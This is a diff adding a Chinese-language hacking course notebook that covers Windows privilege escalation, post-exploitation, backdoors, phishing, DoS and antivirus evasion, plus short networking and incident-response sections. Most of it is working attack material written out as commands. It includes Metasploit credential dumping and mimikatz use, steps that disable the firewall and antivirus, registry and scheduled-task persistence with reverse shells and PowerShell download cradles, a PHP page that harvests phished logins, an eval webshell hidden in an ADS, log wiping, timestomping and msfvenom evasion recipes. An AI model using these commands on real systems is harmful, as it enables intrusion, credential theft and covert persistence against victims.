@@ -1,0 +1,1023 @@
+操作系统权限及密码破解
+
+系统权限：windows:
+system
+administrator
+(others)
+linux:
+root
+(others)
+>>>>
+CPU:
+OS（操作系统）
+ring0（驱动程序）
+ring3（大多数软件）
+windows ddk
+usb接口
+硬件编程
+>>>>
+操作系统提权：
+ms14_058,ms16_016
+目标x32位系统
+use exploit/windows/local/ms14_058...
+show options
+set session 1
+exploit
+如果使用成功会返回一个新的session号
+>>>>
+cve
+cnnvd
+>>>>
+目标信息采集：
+需要进入到一个sessions里
+run post/windows/gather/forensics/xxxxx 取证模块
+run post/windows/gather/checkvm 检测是否为虚拟机
+run post/windows/gather/enum_services 查看运行的服务
+run post/windows/gather/enum_applications 查看电脑安装了哪些应用
+run post/windows/gather/enum_shares 查看共享
+run post/windows/gather/dumplinks 查看最近操作（安装东西）
+run post/windows/gather/enum_patches 查看用户安装了哪些补丁
+>>>>
+cd /usr/share/metasploit-framework/scripts/resource/ 可以看到大佬的脚本
+>>>>
+run scraper 导出所有信息
+run winenum 搜集系统环境变量
+>>>>
+数据包捕获：
+流媒体，很难搞
+安装python环境，pip install -i https://pypi.doubanio.com/simple you-get
+you-get -i [视屏地址]
+看到视频所有支持的格式
+按照提示去下载视频
+
+
+++++++++++
+
+系统防火墙原理以及突破
+
+数据和嗅探：
+
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe -o msf.exe
+==
+进入session
+load sniffer 加载嗅探模块
+==
+sniffer_interfaces 查看电脑网卡
+==
+sniffer_start 2 对2号网卡进行嗅探操作
+==
+sniffer_dump 2 2.cap 把2号网卡的数据包保存为/root/2.cap
+==
+wireshark 2.cap 使用wireshark查看抓到的包
+==
+sniffer_stop 2 停止对2号网卡的嗅探
+==
+
+>>>>
+host 注入
+use post/windows/manage/inject_host 使用注入模块
+show options
+set IP [自己的ip] 这里的ip是之后目标指向的ip
+set DOMAIN [要篡改的域名] 要伪造什么域名
+set SESSION [session-id] 对哪个session-id进行修改
+exploit
+>>>>
+用户认证钓鱼窗口
+==
+进入sesion中
+==
+run post/windows/gather/phish_windows_credentials
+==
+这个时候管理员的桌面会出现认证窗口（假的）
+==
+passTheHash:
+必须是system权限
+进入一个session
+==
+run post/windows/gather/hashdump 获得操作系统的用户hash值
+==
+可以获取到管理员密码加密之后的密码，之后使用穷举的方法破解
+==
+使用猕猴桃：
+进入session
+load mimikatz(load kiwi) 加载猕猴桃
+help kiwi 查看猕猴桃的命令
+creds_all 列出所有的凭据
+creds_kerberos 拿到所有密码
+creds_msv 只列出加密之后的密码
+电脑版本的猕猴桃
+扫雷外挂
+winmine::infos
+>>>>
+防火墙和3389端口：
+关闭防火墙
+netsh advfirewall set allprofiles state off
+关闭defener
+net stop windefend
+关闭dep(数据执行保护)
+bcdedit.exe /set {current} nx AlwaysOff
+关闭杀毒软件
+run killav
+(run post/windows/manage/killav)
+开启远程桌面(3389)
+run post/windows/manage/enable_rdp
+run getgui -e 开启远程桌面（不太靠谱）
+run getgui -u 用户名 -p 密码
+run getgui -e -f 8888 开启远程桌面并且绑定在8888端口上
+kali图形界面使用远程桌面
+rdesktop -u [用户名] -p [密码] [目标ip]
+截图
+load espia
+screengrab
+>>>>
+后门植入：
+meterpreter shell 运行是在内存中的，重启消失，植入后门
+卸载对方的补丁
+给对方安装一些有漏洞的软件（比如说ftp程序，输入法等等）
+考虑粘滞键漏洞
+按5下shift键
+新建一个x.bat
+takeown /f c:\windows\system32\sethc.* /a /r /d y
+cacls c:\windows\system32\sethc.exe /T /E /G system:F
+cacls c:\windows\system32\sethc.exe /T /E /G administrator:F
+copy c:\windows\system32\cmd.exe c:\windows\system32\sethc.exe /y
+普通状态是登录者的权限，如果是要登录的状态召唤出漏洞就是system权限
+++++++++++
+
+企业内网环境介绍
+IT
+程序员
+系统工程师（linux windows unix）
+网络工程师（cisco huawei juniper....）
+CCNA CCNP CCIE
+R&S ISP SEC DC Voice Wire
+笔试 lab（ts+diag+cfg)
+cisco packet tracer
+winpcap
+>>>>
+网络工程
+==
+终端设备：
+手机 电脑 服务器 ATM.....
+==
+以太网交换机:
+连接同一个网段之间的东西
+前身（hub=集线器）
+==
+路由器：
+连接不同网段的东西
+>>>>
+OSI七层：
+ISO-OSI模型：
+==
+1.物理层
+光电，电磁波，在线路上传输(hub)
+==
+2.数据链路层
+数据交换(以太网交换机)
+定义数据如何格式化，进行编址mac地址
+==
+3.网络层
+数据传递，路由信息报文（路由器）
+可以选择最优的路径去访问目标（ip地址，路由协议）
+==
+4.传输层
+端到端的通信（point-to-point）
+==
+5.会话层
+主机到主机的通信
+建立，管理，结束程序之间的会话
+==
+6.表示层
+数据以什么形式表示出来（加密服务，格式化/结构化数据）
+==
+7.应用层
+我们的程序（http https ftp smtp snmp...）
+>>>>
+交换机，接电后直接启动，大多数情况不需要命令配置
+
+cisco路由器命令行：
+
+en //启动并进入特权模式
+conf t 进入全局配置模式
+ho R1 取名R1
+
+优化命令
+no ip domain-lo 不要查询出错的命令
+line con 0 进入console 0调试
+no exec-t 不要超时把我弹出
+logg syn 命令和弹出的内容换行显示
+
+int [接口] 进入某个接口进行配置
+no sh 物理开启接口
+ip add [ip地址] [子网掩码] 配置ip地址
+
+int loo [编号] 环回口（本地测试）
+
+sh ip int bri 查看接口的所有信息
+sh run 查看路由器中所有配置
+
+静态路由：
+
+路由器是靠路由表来知道目的地怎么走的
+
+sh ip route 查看路由表
+
+ip route [目标网段] [子网掩码] [下一跳ip/接口]
+
+no [命令] 删除命令
+>>>>
+理论上：
+路由器=点=网络节点=node
+>>>>
+路由协议：
+
+动态路由协议:
+
+rip路由信息协议（最大16跳）
+eigrp （cisco私有）增强内部网关路由协议
+ospf（公有）最短路径优先（使用范围很广）
+is-is（公有）中间系统到中间系统（运营商用的很多）
+BGP（最强且公有，支撑着全球互联网运行的）边界网关路由协议
+
+>>>>
+
+R1
+router ospf 1
+router-id 1.1.1.1
+net 192.168.1.0 0.0.0.255 a 0
+net 1.1.1.1 0.0.0.0 a 0
+net 13.13.13.0 0.0.0.255 a 0
+
+R2
+router os 1
+router-id 2.2.2.2
+net 2.2.2.2 0.0.0.0 a 0
+net 192.168.2.0 0.0.0.255 a 0
+net 23.23.23.0 0.0.0.255 a 0
+
+R3(isp)
+router os 1
+router-id 3.3.3.3
+net 3.3.3.3 0.0.0.0 a 0
+net 13.13.13.0 0.0.0.255 a 0
+net 23.23.23.0 0.0.0.255 a 0
+
+sh ip os nei 查看ospf邻居
+==
+交换机
+sh mac 查看mac地址表
+
+++++++++++
+
+社会工程学认识
+
+社会工程学
+
+网络钓鱼：
+使用网站克隆工具
+实在不行，用手写
+
+<?php
+
+$username = $_POST['TextBoxUserName'];
+$password = $_POST['TextBoxPwd'];
+
+$txt = $username.'----'.$password;
+
+$file = fopen('./haha.txt','w');
+fwrite($file,$txt);
+fclose($file);
+
+header("location:https://login.cnki.net/login/?platform=kns&ForceReLogin=1&ReturnURL=https://www.cnki.net/");
+
+?>
+
+>>>>
+电话钓鱼：
+https://www.spoofbox.com/zh
+skype
+
+伪装模拟：
+防止人家使用社工手段追踪自己
+安全指数最高的邮箱
+mail.protonmail.com
+10分钟邮箱
+短信接码平台
+
+自己制作网站：
+vps(网页 vpn)
+[cloudflare只能帮你防御80和443端口的攻击和追踪]
+
+>>>>
+
+个人信息搜集：
+策略
+
+可查询到的内容：qq 微信 博客 微博 社区 贴吧 开房记录 外卖 快递 手机app
+社工库
+人轨
+qq-->手机号-->支付宝
+群关系，学校，同学关系
+3D面部建模（证件照，身份证，护照......）
+简历，公司关系查询
+
+>>>>
+渗透到对方的服务器之后：
+mmc--事件查看器
+（删除日志这件事本身就是一个日志，而且日志理论上无法单条删除）
+meterpreter---clearev
+>>>>
+vultr---使用kali的live模式--关闭ssh--直接使用网页连接(中国ip--美国vpn--vultr公司ip--内部网络操作kali-live)
+https://anonfiles.com/
+
+++++++++++
+
+认识系统后门
+
+meterpreter运行在内存里的创建x64木马
+msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.120 lport=4444 -f exe > msf.exe
+通过服务启动：
+run metsvc -A 设定端口上传后门文件
+开启一个31337端口
+如何利用后门
+use exploit/multi/handler
+set payload windows/metsvc_bind_tcp
+set lport 31337
+set rhost [对方的ip]
+exploit
+>>>>
+在session中启动
+run persistence -A -S -U -i 60 -p 4321 -r [黑客ip]
+安插一个永久性后门，60s上线一次，使用4321端口
+如果msf关闭了，下次重开
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lport 4321
+set lhost [自己ip]
+exploit
+即使sessions -k [id] 过了60s还会回来
+>>>>
+上传文件：
+进入一个session中
+upload /root/nc.exe c:\\
+查看注册表里有什么
+reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
+把nc放到自动启动里
+reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'c:\nc.exe -Ldp 444 -e cmd.exe'
+查看代码写的对不对
+reg queryval -k  HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
+查看防火墙状态
+netsh firewall show opmode
+添加一个防火墙规则允许444端口通过
+netsh firewall add portopening TCP 444 "FireWall" ENABLE ALL
+目标主机重启之后
+nc -v [目标ip] 444
+>>>>
+拓展：
+注册表修改的内容可以在msconfig的启动选项卡里看到
+可以考虑使用自解压的方法进行伪装...
+>>>>
+使用vbs去远程下载文件:
+创建一个a.vbs
+set a=createobject("adod"+"b.stream"):set w=createobject("micro"+"soft.xmlhttp"):w.open"get",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2
+cmd运行
+cscript a.vbs http://www.xx.com/haha.txt c:\b.txt
+使用echo直接写
+echo set a=createobject("adod"+"b.stream"):set w=createobject("micro"+"soft.xmlhttp"):w.open"get",wsh.arguments(0),0:w.send:a.type=1:a.open:a.write w.responsebody:a.savetofile wsh.arguments(1),2 >> a.vbs
+>>>>
+certutil下载文件：
+certutil -urlcache -split -f http://www.xx.com/haha.txt
+会下载到本目录
+有一个弊端：
+每次下载的时候，都有留存，导致留下入侵痕迹，所以每次下载之后，都要清理痕迹
+certutil -urlcache -split -f http://www.xx.com/haha.txt delete
+校验hash值：
+certutil -hashfile c:\xxx.exe
+如果文件被动过，hash值就会改变
+加密解密文件：
+certutil -encode c:\haha.txt c:\haha-en.txt
+certutil -decode c:\haha-en.txt c:\haha-de.txt
+>>>>
+使用bitsadmin下载：
+下载主命令：
+bitsadmin /rawreturn /transfer down http://www.xx.com/haha.txt c:\haha.txt
+提高下载主命令的优先级（下载大型文件）:
+bitsadmin /setpriority down foreground
+>>>>
+使用js下载：
+创建一个a.js
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET",WScript.Arguments(0),/*async=*/false);WinHttpReq.Send();
+WScript.Echo(WinHttpReq.ResponseText);
+cscript /nologo a.js http://www.xx.com/haha.txt >> 123.txt
+>>>>
+直接保存为文件
+var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+WinHttpReq.Open("GET",WScript.Arguments(0),/*async=*/false);WinHttpReq.Send();
+BinStream = new ActiveXObject("ADODB.Stream");
+BinStream.Type = 1;
+BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);
+BinStream.SaveToFile("abc.exe");
+cscript /nologo a.js http://www.xx.com/aa.exe
+>>>>
+使用ftp脚本:
+a.bat
+echo open [黑客ip] > ftp.txt
+echo test>> ftp.txt
+echo 123>> ftp.txt
+echo binary>> ftp.txt
+echo get haha.txt>> ftp.txt
+echo bye >> ftp.txt
+ftp -s:ftp.txt
+
+>>>>
+其他命令：
+uictl [enable/disable] [keyboard/mouse/all] 开启/停用键盘/鼠标
+webcam_list 查看摄像头
+webcam_snap 通过摄像头拍照
+webcam_stream 通过摄像头开启视频
+execute 在目标上执行文件
+execute -H -i -f cmd.exe 创建新的隐藏可交互的命令cmd.exe
+getpid 获取当前进程的pid
+ps 查看活跃进程
+migrate [pid] 将meterpreter转移到某个pid中
+kill [pid] 杀死某个进程
+clearev 清除日志，清除windows里的应用程序，系统日志，安全日志
+timestomp -v c://a.exe 查看c盘的a.exe的时间戳
+timestomp c://b.exe -f c://a.exe 将a.exe的时间戳复制给b.exe
+
+
+++++++++++
+
+认识木马程序
+
+运维：系统工程师，linux,windows
+网络工程师，路由器，交换机，防火墙...
+（不会编程）
+自动运维
+图形界面
+>>>>
+文件头的作用：
+告诉系统，把下面的二进制代码，当作什么来执行
+操作系统为了方便用户使用，使用后缀名这个机制：
+.exe .dll .jpg .jpeg .png .avi .mp3 .mp4....
+>>>>
+协议：
+xx协议：
+协议头001100->内容1->结束语1111
+001100 xxxxxxxxx xxxx xxxx xxxxx 1111
+01011101010110101011101010 001100 1011010101011010101 1111 1010101010110101010101
+PE文件(exe程序):
+PE头，代码段，函数，资源，结尾
+>>>>
+文件合并：
+copy Penguins.jpg /a + haha.rar /b xxx.jpg
+既可以用jpg打开（有时候不靠谱），也可以用rar打开
+用c32把rar的代码直接复制到jpg文件的最后，保存(使用二进制的方法进行合并)
+这样就是完整的隐写
+>>>>
+木马=干坏事的exe
+生成txt格式的木马（使用msi来执行）
+msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.120 lport=4444 -f msi > haha.txt
+静默安装包=msi
+默认位置：
+C:\Windows\System32\msiexec.exe
+C:\Windows\SysWOW64\msiexec.exe
+远程加载木马到电脑运行
+msiexec /q /i http://192.168.1.252/haha.txt
+>>>>
+dll执行法：
+msfvenom -p windows/x64/shell/reverse_tcp lhost=192.168.1.120 lport=4444 -f dll > haha.dll
+msiexec /y xxx.dll
+rundll32.exe shell32.dll,Control_RunDLL ./haha.dll
+>>>>
+forfiles执行
+默认位置：
+C:\Windows\System32\forfiles.exe
+C:\Windows\SysWOW64\forfiles.exe
+forfiles /p c:\windows\system32 /m cmd.exe /c "msiexec /q /i http://192.168.1.252/haha.txt"
+>>>>
+pstools微软官方自带的系统插件：
+准备工作：
+1.目标主机防火墙最好关闭！
+2.创建/获得对方计算机用户名密码！
+直接控制对方的cmd
+psexec \\目标ip -u [目标用户名] -p [密码] cmd.exe
+控制对方运行自己的b.exe
+psexec \\目标ip -u [目标用户名] -p [密码] -c c:\b.exe
+控制对方运行他电脑的a.exe
+psexec \\目标ip -u [目标用户名] -p [密码] -d c:\a.exe
+控制对方运行自己的b.exe并且以system权限运行
+psexec \\目标ip -u [目标用户名] -p [密码] -s -c c:\b.exe
+以显示的方式运行
+psexec \\目标ip -u [目标用户名] -p [密码] -i -s -c c:\b.exe
+>>>>
+pcalua
+处理情况：
+1.当前电脑的硬盘不能用
+2.自己权限不高
+pcalua -m -a \\[自己的ip]\[共享名]
+>>>>
+zipfldr执行共享程序
+rundll32.exe zipfldr.dll,RouteTheCall \\[自己的ip]\[共享名]\文件名
+>>>>
+权限维持：
+ADS隐藏文件：
+echo ^<?php @eval($_POST['cmd']);?^> > index.php:haha.jpg
+其实生成了一个不可见的haha.jpg，常规文件管理器，type命令，dir命令，del命令
+都找不到haha.jpg
+访问方法：
+进入文件所在的目录,notepad index.php:haha.jpg 或者dir /r
+如何删除haha.jpg
+直接删除index.php
+>>>>
+驱动级的文件隐藏：
+http://www.xoslab.com/efl.html
+如果在相应目录未查到对应文件，但是系统目录存在以下文件：
+c:\windows\xlkfs.xxx
+(dat,dll,ini,log)
+C:\Windows\System32\drivers\xlkfs.sys
+说明碰到了驱动级的文件隐藏
+如何清除：
+1.查询服务状态 sc qc xlkfs
+2.停止服务 net stop xlkfs
+3.删除服务 sc delete xlkfs
+4.把找到的xlkfs.xxxx都删除了
+>>>>
+注册表自启动：
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+winlogo/userinit
+HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+logon script
+HKEY_CURRENT_USER\Environment
+创建一个字符串值
+UserInitMprLogonScript
+设置数值数据为
+c:\a.exe
+>>>>
+计划任务：
+schtasks /create /sc minute /mo 1 /tn "haha" /tr "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\"\"\"http://192.168.1.252/haha.txt\"\"\"))\""
+>>>>
+服务启动：
+sc create "nihao" binpath= "cmd /c start mkdir c:\123" 增加一个服务
+sc description nihao "hahahahah" 设置服务的描述
+sc config nihao start= auto 设置自动启动
+net start nihao 开启服务
+
+++++++++++
+
+认识手机木马以及移动安全
+
+android基于linux
+开发语言java
+应用广泛：
+什么地方都有java虚拟机
+java->臃肿->java虚拟机->c语言->机器语言->操作系统
+oc/swift->机器语言->操纵系统
+>>>>
+java web
+jsp+linux+mysql/oracle/db2+tomcat
+php+linux+nginx+mysql
+>>>>
+jvm pc
+java=>jar程序
+kotlin(简单)=>jar程序
+c#(c++++难度不高，用户多)/python（超级简单）都很牛逼
+Golang(c的精确度，python的快速开发，几乎啥事都能做)
+>>>>
+java android
+java + c(编写.so=windows的dll文件)=>android
+kotlin(像python，写代码非常快)+c => android
+>>>
+android木马:
+java环境
+大多数情况，木马只需要具备：
+上线，文件控制，提权（可有可无），命令执行
+如果想学android开发：
+不要太在意自己学的是不是java，因为android上的编程，相当于一门长得很像java的java语言
+>>>>
+DOS拒绝服务攻击
+DDOS分布式拒绝服务攻击
+tcp三次握手
+目前这种攻击无解
+一般大佬的防御（用钱）
+>>>>
+kali的更新源设置为阿里云的：
+/etc/apt/source.list
+deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+apt-get update 更新
+apt-get install thc-ssl-dos 安装软件
+>>>>
+类似kali的安全审计系统
+https://www.parrotsec.org/
+>>>>
+DOS:
+ssl-dos:
+服务器每次会处理300次/s的ssl请求
+这种攻击方法和传统攻击不一样，使用普通带宽也可以考虑打30G带宽的服务器
+apt-get install thc-ssl-dos
+目标是打击https的网站
+thc-ssl-dos [目标ip] [目标ssl端口:443] --accept
+>>>>
+syn flood
+syn洪水攻击
+apt install python-scapy
+apt install python3-scapy
+git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.git
+cd Python-SYN-Flood-Attack-Tool
+python3 py3_synflood_cmd.py -t 10.20.30.40 -p 8080 -c 5
+python3 py3_SYN-Flood.py
+python SYN-Flood.py
+>>>>
+sockstress
+针对tcp服务，耗尽目标资源，建立大量的sock连接，不消耗网络资源
+完成tcp3次握手，最后ack大小为0（客户端不接收数据）
+攻击者损耗很小
+异步攻击，所以一台设备可以造成很大的效果
+windows窗口实现流控
+需要python2环境并且安装scapy
+./sockstress.py [目标ip] [端口号] [线程]
+>>>>
+dns放大攻击
+发送给dns的数据包94
+返回的数据包大小160+
+典型的流量放大攻击
+单机带宽优势，以小汇多
+利用协议的特性放大流量
+apt-get install dnsutils
+安装dig命令
+dig ANY qq.com @[dns的ip]
+利用回包判断dns服务器是否会被利用
+>>>>
+慢速攻击(打击网站有效果):
+apt-get install openssl
+apt-get install libssl-dev
+apt-get install slowhttptest
+slowhttptest
+低带宽应用层慢速DOS攻击（相对于cc慢）
+擅长攻击apache tomcat...服务器
+Slowloris,slow http post攻击
+耗尽应用并发的连接池，类似于http层的syn_flood
+http协议默认在服务端全部接收到请求之后才开始处理，如果客户发送的数据包慢速而且不完整，就会导致Dos
+Slowloris:完整的http结尾是\r\n\r\n，它的攻击结尾\r\n
+slow http post攻击:http头部content-length声明长度，但是body缓慢发送
+slow http post慢速攻击(RUDY):
+slowhttptest -c 2000 -B -g -o body_states -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.1.214 -x 10 -p 3
+Slowloris攻击：
+slowhttptest -c 2000 -H -g -o my_header_states -i 10 -r 1000 -t GET -u http://192.168.1.214 -x 24 -p 3
+>>>>
+hping3
+定制发送任何的数据包
+-a 伪造源地址
+-q 不返回
+-n 不解析域名
+-s 源端口
+-d 字节数
+-p 端口
+--flood 以flood方式攻击
+syn-flood
+hping3 -c 3000 -d 120 -S -w 64 -p 80 --flood --rand-source [目标ip]
+hping3 -S -P -p 80 --flood --rand-source [目标ip]
+tcp-flood
+hping3 -SARUFP -p 80 --flood --rand-source [目标ip]
+icmp-flood
+hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood [目标ip]
+udp-flood
+hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood [目标ip]
+LAND
+特殊的syn-flood攻击
+源地址和目的地址都是受害者，自己和自己完成3次握手
+hping3 -n -a [目标ip] -S -d 100 -p 80 --flood [目标ip]
+TCP全链接DOS攻击
+nping --tcp-connect --rate=10000 -c 10000000 -q [目标ip]
+>>>>
+siege -i -c 1000000 [目标ip] -A httttttp
+t50压力测试
+网络协议支持全面
+t50 -h 可以查看参数
+t50 [目标网关] --flood --turbo -S --protocol TCP --dport 22
+t50 --flood --protocol TCP [目标ip] --dport 80
+
+++++++++++
+
+黑客攻击应急响应
+
+应急响应web入侵：
+挂马，网页篡改（菠菜，黑帽seo），植入webshell，黑页，暗链等
+主机入侵：
+病毒木马，勒索病毒，远控后门，系统异常，RDP爆破，SSH爆破，主机漏洞，数据库入侵等
+网络攻击：
+DDOS/CC攻击，ARP攻击，DNS/HTTP劫持
+路由器/交换机攻击：
+内网病毒，配置错误，机器本身的漏洞等
+>>>>
+windows应急响应：
+病毒，木马，蠕虫事件
+web服务器或者第三方服务入侵事件
+系统入侵事件
+网络攻击
+==
+日志查看
+eventvwr.msc
+==
+检查账户
+==
+文件分析：
+临时目录排查
+tmp/temp
+C:\Users\Administrator\Local Settings\Temp
+浏览器相关文件
+C:\Users\Administrator\Local Settings\History
+==
+最近打开文件
+==
+文件修改时间
+==
+hosts文件
+==
+网络行为排查：
+重要的辅助站点：
+https://www.virustotal.com/
+https://x.threatbook.cn/
+https://beian.cndns.com/
+google baidu
+==
+网络连接排查
+metstat -ano
+流量分析
+wireshark/burpsuite/charles
+xxxxx.3322.org
+漏洞与补丁信息
+systeminfo
+==
+可疑进程分析：
+进程名字异常/伪装
+hsdLj3.tmp
+进程信息排查
+pchunter
+==
+启动项排查：
+msconfig
+计划任务
+注册表的自动启动
+==
+特定事件痕迹：
+挖矿病毒
+勒索病毒
+>>>>
+linux应急响应：
+cpu飙升
+服务器卡顿
+异常流量
+异常网络连接
+服务器无法登录
+僵尸网络
+挖矿
+dns服务器报毒
+ifconfig
+top -c
+lsof -i -PnR 查看网络通信情况
+ps aux | grep [PID] 查看进程信息
+lsof -p [PID] 查看进程打开的文件
+md5sum [文件名] 计算文件的md5值
+==
+网络行为分析
+who
+查看当前用户的登录信息
+uname -a
+查看系统信息
+netstat -ano
+所有网络连接
+netstat -utnpl
+查看带端口情况的
+arp -a
+查看arp表
+iptables
+iptables -A OUTPUT -d 123.123.123.123 -j DROP
+iptables -I INPUT -p tcp --dport 443 -m string --string "xxx.com" --algo bm -j DROP
+==
+进程检查
+ps aux
+ps -ef
+top -c
+lsof -p [pid]
+lsof -i
+lsof -c
+==
+启动项排查
+/etc/init.d/
+/etc/xinetd.d
+查看rc.local文件
+/etc/rc.d/rc[0-6].d
+/etc/profile.d/
+init文件名，系统启动的第一个脚本
+init.d目录名，服务启动脚本
+rcX.d目录名，
+==
+计划任务
+/etc/crontab
+/var/spool/cron/root
+crontab -l
+crontab -r
+crontab -e
+==
+服务排查
+cat /etc/services
+1-1024 系统保留，大多数情况只能由root使用
+1024-4999 由客户端程序自由分配
+5000-65535 由服务端程序自由分配
+服务自启动
+chkconfig --level 2345 httpd on
+0 = 关机
+1 = 单用户
+2 = 有网络连接的多用户命令行模式
+3 = 无网络连接的多用户命令行模式
+4 = 不可用
+5 = 带图形界面的多用户模式
+6 = 重新启动
+chkconfig --list 查看服务自启动状态
+--del
+==
+文件检查
+rpm -Va 查看所有软件包的变化情况
+/tmp
+/etc/init.d
+/usr/bin
+/usr/sbin
+/root
+/boot
+/bin
+/sbin
+/etc/passwd
+/etc/shadow
+ls -alt
+按时间排序
+find / *.py -perm 4777
+ls -al /tmp | grep "Feb 10"
+==
+帐号检查
+w
+查看某一时刻用户行为
+cat /etc/passwd
+cat /etc/shadow
+less /etc/passwd
+usermod -L [user]
+userdel [user]
+userdel -r [user]
+删除用户之后，/home目录下的用户名文件夹也删了
+last 查看成功的登录 /var/log/wtmp
+lastb 登录失败情况/var/log/btmp
+lastlog 查看上一次用户登录情况 /var/log/lastlog
+last -x reboot 查看重启记录
+last -x shotdown 查看关机记录
+==
+历史命令检查
+.bash_history
+history 查看历史命令
+history -c  清空历史命令
+==
+cat /etc/hosts
+处置命令：
+chattr +i [目标文件]
+chmod 000 [目标文件]
+==
+日志位置：
+/var/log/
+日志配置文件
+/etc/rsyslog.conf
+
+++++++++++
+
+免杀技术以及木马处理
+
+免杀如果需要深入了解
+破解、二进制、逆向工程
+>>>>
+杀毒软件原理：
+扫描技术：
+扫描压缩包：
+对压缩包内容进行分析检查
+程序篡改防护：
+避免感染文件
+修复技术：
+对受损文件进行还原
+急救盘杀毒：
+利用空白的u盘制作进行杀毒
+智能扫描：
+扫描常用磁盘和系统关键位置
+全盘扫描：
+所有地方都扫描
+勒索软件防护：
+保护电脑文件不被加密
+开机扫描：
+扫描可能不需要的程序
+监控技术：
+内存监控：
+监控内存，进程，网络数据
+文件监控：
+发现文件存在病毒或者被感染报警
+邮件监控：
+电子邮件病毒拦截
+网页防护：
+阻止网络攻击和不安全的下载
+行为防护：
+提醒用户应用程序可疑的行为
+>>>>
+安装wine32
+dpkg --add-architecture i386 && apt update && apt -y install wine32
+>>>>
+安装pip
+wget https://bootstrap.pypa.io/2.6/get-pip.py
+python2 get-pip.py
+apt-get install python3-pip
+pip install --upgrade pip -i https://pypi.douban.com/simple
+>>>>
+普通木马
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f exe -o shell.exe
+56/71
+==
+msf自带免杀
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -e x86/shikata_ga_nai -b "\x00" -i 15 -f exe -o shell.exe
+55/71
+==
+msf捆绑免杀
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -x putty.exe -f exe -o shell.exe
+44/71
+==
+msf自带免杀+捆绑
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -e x86/shikata_ga_nai -x putty.exe -i 15 -f exe -o shell.exe
+45/70
+==
+backdoor factory
+进入文件夹
+chmod 777 ./*
+./install.sh
+pip install -i https://pypi.douban.com/simple pefile/capstone
+查看这个程序是否支持插入代码
+python backdoor.py -f /root/putty.exe -S
+查找程序里大于600的缝隙
+python backdoor.py -f /root/putty.exe -c -l 600
+获取文件可用的payload
+python backdoor.py -f /root/putty.exe -s show
+生成payload
+python backdoor.py -f /root/putty.exe -s reverse_shell_tcp_inline -H 192.168.1.144 -P 4444 -J -o haha.exe
+26/70
+用户自己做的木马
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f raw -o shell.c
+python backdoor.py -f /root/putty.exe -s user_supplied_shellcode_threaded -U /root/shell.c -o haha.exe
+48/71
+>>>>
+unicorn
+python unicorn.py windows/meterpreter/reverse_tcp 192.168.1.144 4444
+生成2个文件，rc文件和txt文件(powershell文件可以考虑变成bat)
+msfconsole -r xxx.rc
+6/59
+>>>>
+spookflare
+安装python依赖库
+pip install -i https://pypi.douban.com/simple -r requirements.txt
+list
+use 1
+info 查看需要set的内容
+generate
+10/59
+>>>>
+sharpshooter
+安装python依赖库
+pip install -i https://pypi.douban.com/simple -r requirements.txt
+msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=192.168.1.144 LPORT=4444 -f raw -o shellcode.txt
+创建hta后门
+python SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./shellcode.txt --sandbox 4 --smuggle --template mcafee
+mshta.exe http://192.168.1.252/foo.hta
+24/61
+>>>>
+msf创建hta程序
+msfconsole
+use exploit/windows/misc/hta_server
+set srvhost [你自己ip]
+set lhost [你自己ip]
+exploit
+会给你一个网址
+mshta http://xxxxxx/xxx.hta
+29/61
+>>>>
+shellter
+apt-get install shellter
+41/71
+Eable Stealth Mode可以no，不然效果会差一点
+39/70
+生成之后在msfconsole里
+handler -H 192.168.1.144 -P 4444 -p windows/meterpreter/reverse_tcp
+>>>>
+msi执行的木马
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f msi > haha.txt
+35/58
+>>>>
+shellcode-launcher
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.144 lport=4444 -f raw -o shell.raw
+24/59
+>>>>
